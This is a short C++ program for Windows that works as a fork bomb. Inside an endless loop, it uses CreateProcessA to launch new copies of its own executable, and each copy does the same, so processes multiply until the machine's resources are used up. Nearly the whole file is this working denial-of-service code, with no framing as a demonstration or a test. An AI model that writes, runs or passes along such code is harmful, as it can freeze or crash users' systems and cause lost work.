#include <windows.h>
#include <iostream>

int main(void) 
{ 
  while(1) 
  {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    // Get the path to the current executable
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // Create a new process (child of current process)
    if (!CreateProcessA(
      exePath,           // Application name
      NULL,              // Command line
      NULL,              // Process security attributes
      NULL,              // Thread security attributes
      FALSE,             // Inherit handles
      0,                 // Creation flags
      NULL,              // Environment
      NULL,              // Current directory
      &si,               // Startup info
      &pi))              // Process information
    {
      std::cerr << "CreateProcess failed (" << GetLastError() << ")." << std::endl;
      return 1;
    }
    
    // Close process and thread handles (not waiting for them to finish)
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
  }
  
  return 0;
}
